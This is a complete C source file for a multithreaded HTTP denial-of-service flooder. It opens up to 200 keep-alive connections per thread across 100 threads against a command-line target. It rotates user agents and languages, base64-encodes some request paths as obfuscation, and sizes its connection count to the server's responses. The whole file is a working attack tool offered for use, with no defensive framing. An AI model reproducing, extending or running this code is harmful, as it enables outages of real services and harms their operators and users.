#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/time.h>
#include <openssl/bio.h>
#include <openssl/evp.h>
#include <openssl/buffer.h>

#define INITIAL_CONNECTIONS 100  // Starting number of TCP connections per thread
#define MIN_CONNECTIONS 50       // Minimum number of connections
#define MAX_CONNECTIONS 200      // Maximum number of connections
#define THREADS 100              // Number of threads
#define MAX_USER_AGENTS 10000    // Maximum number of user agents
#define MAX_URL_PATHS 1000       // Maximum number of URL paths
#define INITIAL_CONNECTION_TIMEOUT 10  // Initial timeout in seconds
#define RESPONSE_TIME_THRESHOLD 1000   // Response time threshold in milliseconds
#define ERROR_RATE_THRESHOLD 10        // Error rate threshold in percentage
#define MAX_FAILED_ATTEMPTS 20         // Maximum consecutive failed attempts before exiting

// Global variables
char *user_agents[MAX_USER_AGENTS];
char *url_paths[MAX_URL_PATHS];
int user_agent_count = 0;
int url_path_count = 0;
int current_connections = INITIAL_CONNECTIONS;
int connection_timeout = INITIAL_CONNECTION_TIMEOUT;
pthread_mutex_t connection_lock;
int total_successful_connections = 0;
int total_failed_connections = 0;
int consecutive_failures = 0;

// Function prototypes
void load_user_agents(const char *filename);
void load_url_paths(const char *filename);
char *base64_encode(const unsigned char *input, int length);
int make_socket(char *host, char *port, int *retry_count);
void adjust_connections(int response_time, int http_status, int *retry_count);
void *tcp_flood(void *arg);
int get_response_time(int sock);
int get_http_status(int sock);

// Function to load user agents from file
void load_user_agents(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        fprintf(stderr, "Could not open %s\n", filename);
        exit(1);
    }

    char line[1024];
    while (fgets(line, sizeof(line), file)) {
        size_t len = strlen(line);
        if (len > 0 && line[len - 1] == '\n') {
            line[len - 1] = '\0';
        }
        user_agents[user_agent_count] = strdup(line);
        user_agent_count++;
    }

    fclose(file);
    if (user_agent_count == 0) {
        fprintf(stderr, "No user agents found in %s\n", filename);
        exit(1);
    }
    fprintf(stderr, "Loaded %d user agents from %s\n", user_agent_count, filename);
}

// Function to load URL paths from file
void load_url_paths(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        fprintf(stderr, "Could not open %s\n", filename);
        exit(1);
    }

    char line[1024];
    while (fgets(line, sizeof(line), file)) {
        size_t len = strlen(line);
        if (len > 0 && line[len - 1] == '\n') {
            line[len - 1] = '\0';
        }
        url_paths[url_path_count] = strdup(line);
        url_path_count++;
    }

    fclose(file);
    if (url_path_count == 0) {
        fprintf(stderr, "No URL paths found in %s\n", filename);
        exit(1);
    }
    fprintf(stderr, "Loaded %d URL paths from %s\n", url_path_count, filename);
}

// Function to perform base64 encoding
char *base64_encode(const unsigned char *input, int length) {
    BIO *bmem, *b64;
    BUF_MEM *bptr;

    b64 = BIO_new(BIO_f_base64());
    bmem = BIO_new(BIO_s_mem());
    b64 = BIO_push(b64, bmem);
    BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL); // Ignore newlines
    BIO_write(b64, input, length);
    BIO_flush(b64);
    BIO_get_mem_ptr(b64, &bptr);
    BIO_set_close(b64, BIO_NOCLOSE);  // So BIO_free_all() doesn't free bptr

    char *buff = (char *)malloc(bptr->length + 1);
    if (buff == NULL) {
        BIO_free_all(b64);
        return NULL;
    }
    memcpy(buff, bptr->data, bptr->length);
    buff[bptr->length] = '\0';

    BIO_free_all(b64);  // Free BIO objects but not the BUF_MEM buffer

    return buff;
}

// Function to create a socket and connect to the target host
int make_socket(char *host, char *port, int *retry_count) {
    struct addrinfo hints, *servinfo, *p;
    int sock, r;
    struct timeval timeout;
    timeout.tv_sec = connection_timeout;
    timeout.tv_usec = 0;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    while (*retry_count < 5) {  // Maximum retries before giving up
        if ((r = getaddrinfo(host, port, &hints, &servinfo)) != 0) {
            fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
            return -1;
        }

        for (p = servinfo; p != NULL; p = p->ai_next) {
            if ((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
                continue;
            }

            setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
            setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

            if (connect(sock, p->ai_addr, p->ai_addrlen) == -1) {
                close(sock);
                continue;
            }

            freeaddrinfo(servinfo);
            return sock;
        }

        if (servinfo)
            freeaddrinfo(servinfo);

        fprintf(stderr, "No connection could be made. Retrying in %d seconds...\n", (1 << *retry_count));
        sleep(1 << *retry_count);  // Exponential backoff
        (*retry_count)++;
    }

    fprintf(stderr, "Failed to establish a connection after %d retries.\n", *retry_count);
    return -1;
}

// Function to adjust the number of connections based on server response
void adjust_connections(int response_time, int http_status, int *retry_count) {
    pthread_mutex_lock(&connection_lock);

    if (response_time > RESPONSE_TIME_THRESHOLD || (http_status >= 500 && http_status < 600)) {
        // Server is under stress, reduce connections and increase retry count
        current_connections = current_connections > MIN_CONNECTIONS ? current_connections - 10 : MIN_CONNECTIONS;
        connection_timeout = connection_timeout < 30 ? connection_timeout + 5 : connection_timeout;
        *retry_count = *retry_count < 5 ? *retry_count + 1 : 5;
    } else if (response_time < RESPONSE_TIME_THRESHOLD / 2 && http_status == 200) {
        // Server is handling well, increase connections and reset retry count
        current_connections = current_connections < MAX_CONNECTIONS ? current_connections + 10 : MAX_CONNECTIONS;
        connection_timeout = connection_timeout > INITIAL_CONNECTION_TIMEOUT ? connection_timeout - 5 : INITIAL_CONNECTION_TIMEOUT;
        *retry_count = 0;
    }

    pthread_mutex_unlock(&connection_lock);
}

// Function to monitor response time
int get_response_time(int sock) {
    struct timeval start, end;
    char buffer[1024];

    gettimeofday(&start, NULL);
    recv(sock, buffer, sizeof(buffer), 0);
    gettimeofday(&end, NULL);

    int response_time = (end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec) / 1000;
    return response_time;
}

// Function to retrieve the HTTP status code
int get_http_status(int sock) {
    char buffer[1024];
    recv(sock, buffer, sizeof(buffer), 0);

    int http_status;
    sscanf(buffer, "HTTP/1.1 %d", &http_status);

    return http_status;
}

// Function to handle TCP flooding
void *tcp_flood(void *arg) {
    char *host = ((char **)arg)[0];
    char *port = ((char **)arg)[1];
    int id = *((int *)(((char **)arg)[2]));

    int sockets[MAX_CONNECTIONS];
    int retry_count = 0;  // Track retries per thread

    for (int x = 0; x != current_connections; x++)
        sockets[x] = 0;

    signal(SIGPIPE, SIG_IGN);  // Ignore SIGPIPE signals

    srand(time(NULL) ^ (pthread_self() << 16));  // Initialize random seed

    while (1) {
        pthread_mutex_lock(&connection_lock);
        int connections_to_manage = current_connections;
        pthread_mutex_unlock(&connection_lock);

        for (int x = 0; x != connections_to_manage; x++) {
            if (sockets[x] == 0)
                sockets[x] = make_socket(host, port, &retry_count);

            if (sockets[x] == -1) {
                total_failed_connections++;
                consecutive_failures++;
                if (consecutive_failures >= MAX_FAILED_ATTEMPTS) {
                    fprintf(stderr, "Too many failed attempts. Exiting...\n");
                    exit(1);
                }
                continue;
            } else {
                consecutive_failures = 0;
                total_successful_connections++;
            }

            const char *user_agent = user_agents[rand() % user_agent_count];
            const char *url_path;
            if (rand() % 100 < 75) {
                url_path = "/";
            } else {
                url_path = url_paths[rand() % url_path_count];
            }

            // Randomize HTTP method and headers
            const char *method = (rand() % 2) ? "GET" : "POST";
            const char *accept_language = (rand() % 2) ? "en-US,en;q=0.5" : "fr-FR,fr;q=0.5";
            const char *accept_encoding = (rand() % 2) ? "gzip, deflate" : "identity";

            // Obfuscate part of the payload using base64 encoding
            char base64_path[1024];
            if (rand() % 2) {
                char *encoded_path = base64_encode((const unsigned char *)url_path, strlen(url_path));
                snprintf(base64_path, sizeof(base64_path), "/%s", encoded_path);
                free(encoded_path);
            } else {
                strncpy(base64_path, url_path, sizeof(base64_path));
            }

            char request[2048];
            snprintf(request, sizeof(request),
                     "%s %s HTTP/1.1\r\n"
                     "Host: %s\r\n"
                     "User-Agent: %s\r\n"
                     "Accept: */*\r\n"
                     "Accept-Language: %s\r\n"
                     "Accept-Encoding: %s\r\n"
                     "Connection: keep-alive\r\n\r\n",
                     method, base64_path, host, user_agent, accept_language, accept_encoding);

            int r = write(sockets[x], request, strlen(request));
            if (r == -1) {
                close(sockets[x]);
                sockets[x] = make_socket(host, port, &retry_count);
            } else {
                int response_time = get_response_time(sockets[x]);
                int http_status = get_http_status(sockets[x]);
                adjust_connections(response_time, http_status, &retry_count);
                fprintf(stderr, "Thread[%i] Socket[%i->%i] -> %i | Response Time: %dms | HTTP Status: %d\n", id, x, sockets[x], r, response_time, http_status);
            }

            // Check if the success rate is too low
            if (total_successful_connections + total_failed_connections > 50) {  // Check after 50 attempts
                double success_rate = (double)total_successful_connections / (total_successful_connections + total_failed_connections) * 100.0;
                if (success_rate < 50.0) {  // If the success rate is less than 50%, exit
                    fprintf(stderr, "Low success rate detected (%.2f%%). Exiting...\n", success_rate);
                    exit(1);
                }
            }
        }

        usleep(50000 + (rand() % 100000));  // Sleep for 50ms to 150ms
    }

    pthread_exit(NULL);
}

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <target_host> <target_port>\n", argv[0]);
        exit(1);
    }

    load_user_agents("/usr/share/dos-tools/user_agents.txt");
    load_url_paths("/usr/share/dos-tools/url_paths.txt");

    pthread_mutex_init(&connection_lock, NULL);

    pthread_t threads[THREADS];
    int thread_ids[THREADS];

    char *args[3];
    args[0] = argv[1];  // Target host
    args[1] = argv[2];  // Target port

    for (int x = 0; x < THREADS; x++) {
        thread_ids[x] = x;
        args[2] = (char *)&thread_ids[x];
        if (pthread_create(&threads[x], NULL, tcp_flood, args) != 0) {
            fprintf(stderr, "Error creating thread %d\n", x);
            exit(1);
        }
        usleep(50000);  // Sleep for 50ms before starting the next thread
    }

    // Wait for all threads to complete
    for (int x = 0; x < THREADS; x++) {
        pthread_join(threads[x], NULL);
    }

    pthread_mutex_destroy(&connection_lock);

    return 0;
}
